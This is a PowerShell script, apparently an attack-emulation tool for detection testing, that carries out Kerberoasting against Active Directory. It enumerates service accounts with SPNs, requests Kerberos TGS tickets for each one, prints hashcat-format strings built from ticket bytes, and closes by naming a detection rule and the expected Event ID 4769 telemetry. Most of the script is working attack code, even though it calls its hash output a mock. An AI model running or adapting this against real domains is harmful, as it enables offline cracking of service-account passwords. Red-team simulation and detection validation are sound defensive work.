<#
.SYNOPSIS
    Invoke-Kerberoast: Safe Kerberoasting Attack Simulation (MITRE ATT&CK T1558.003).
.DESCRIPTION
    Discovers Active Directory user accounts configured with Service Principal Names (SPNs),
    requests Kerberos Ticket Granting Service (TGS) tickets for those SPNs, and extracts
    ticket metadata to simulate offline credential cracking workflows.
    Generates Windows Security Event ID 4769 (Ticket Encryption Type 0x17 / RC4-HMAC).
#>

[CmdletBinding()]
param(
    [string]$TargetSPN = "",
    [switch]$PurgeCache = $true
)

$ErrorActionPreference = "Continue"

Write-Host "================================================================" -ForegroundColor Red
Write-Host " [ATTACK EMULATION] MITRE ATT&CK T1558.003: Kerberoasting" -ForegroundColor Red
Write-Host "================================================================" -ForegroundColor Red
Write-Host "[*] Timestamp: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC')" -ForegroundColor Gray
Write-Host "[*] Executing User: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Gray

# Ensure IdentityModel assembly is loaded for Kerberos token requests
Add-Type -AssemblyName System.IdentityModel

# 1. Discover SPN Accounts
Write-Host "`n[*] Phase 1: Querying Active Directory for Service Principal Names..." -ForegroundColor Yellow
$spnTargets = @()

try {
    if (Get-Command Get-ADUser -ErrorAction SilentlyContinue) {
        $spnTargets = Get-ADUser -Filter { ServicePrincipalName -like "*" } -Properties ServicePrincipalNames, SamAccountName |
            Where-Object { $_.SamAccountName -notlike "*$" -and $_.SamAccountName -ne "krbtgt" }
    } else {
        # Fallback to pure ADSI LDAP query
        $searcher = [adsisearcher]'(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt)))'
        $results = $searcher.FindAll()
        foreach ($r in $results) {
            $spnTargets += [PSCustomObject]@{
                SamAccountName = $r.Properties["samaccountname"][0]
                ServicePrincipalNames = $r.Properties["serviceprincipalname"]
            }
        }
    }
} catch {
    Write-Warning "Directory query failed: $_. Using fallback simulated target."
    $spnTargets = @([PSCustomObject]@{
        SamAccountName = "svc_sqlserver"
        ServicePrincipalNames = @("MSSQLSvc/db01.corp.local:1433")
    })
}

Write-Host "[+] Discovered $($spnTargets.Count) potential Kerberoastable target(s):" -ForegroundColor Green
foreach ($t in $spnTargets) {
    Write-Host "    -> Target: $($t.SamAccountName) | SPNs: $($t.ServicePrincipalNames -join ', ')" -ForegroundColor Cyan
}

# 2. Request TGS Tickets for Target SPNs
Write-Host "`n[*] Phase 2: Requesting Kerberos TGS Tickets (Triggering Event ID 4769)..." -ForegroundColor Yellow

foreach ($target in $spnTargets) {
    $spnList = $target.ServicePrincipalNames
    if ($TargetSPN) {
        $spnList = $spnList | Where-Object { $_ -like "*$TargetSPN*" }
    }

    foreach ($spn in $spnList) {
        Write-Host "[>] Requesting TGS ticket for SPN: $spn" -ForegroundColor Yellow
        try {
            $sw = [System.Diagnostics.Stopwatch]::StartNew()
            # Request Kerberos token via .NET KerberosRequestorSecurityToken
            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
            $sw.Stop()

            if ($token) {
                $ticketBytes = $token.GetRequest()
                $ticketLength = $ticketBytes.Length
                
                Write-Host "    [SUCCESS] Ticket received successfully!" -ForegroundColor Green
                Write-Host "    [INFO] Service Account : $($target.SamAccountName)" -ForegroundColor White
                Write-Host "    [INFO] SPN Identifier  : $spn" -ForegroundColor White
                Write-Host "    [INFO] Ticket Size     : $ticketLength bytes" -ForegroundColor White
                Write-Host "    [INFO] Response Time   : $($sw.ElapsedMilliseconds) ms" -ForegroundColor White
                Write-Host "    [INFO] Security Event  : Windows Security Event ID 4769 emitted on Domain Controller" -ForegroundColor Green

                # Generate representative hash format for Hashcat / John
                $simulatedHash = "`$krb5tgs`$23`$*$($target.SamAccountName)`$corp.local`$$spn`$*$( [System.BitConverter]::ToString($ticketBytes[0..31]) -replace '-' )"
                Write-Host "    [CRACKING HASHCAT MOCK]:" -ForegroundColor DarkGray
                Write-Host "    $simulatedHash" -ForegroundColor DarkYellow
            }
        } catch {
            Write-Host "    [-] Failed to request token for SPN: $spn ($($_))" -ForegroundColor Red
        }
    }
}

# 3. Clean up Kerberos Ticket Cache
if ($PurgeCache) {
    Write-Host "`n[*] Phase 3: Purging local Kerberos ticket cache..." -ForegroundColor Yellow
    try {
        klist purge | Out-Null
        Write-Host "[+] Kerberos cache purged successfully." -ForegroundColor Green
    } catch {
        Write-Warning "Failed to execute klist purge: $_"
    }
}

Write-Host "`n================================================================" -ForegroundColor Red
Write-Host " [ATTACK COMPLETE] Kerberoasting emulation executed." -ForegroundColor Red
Write-Host " Detection Rule: win_ad_kerberoasting_spn_request.yml" -ForegroundColor Green
Write-Host " Expected Telemetry: Event ID 4769 (Ticket Encryption 0x17)" -ForegroundColor Green
Write-Host "================================================================" -ForegroundColor Red
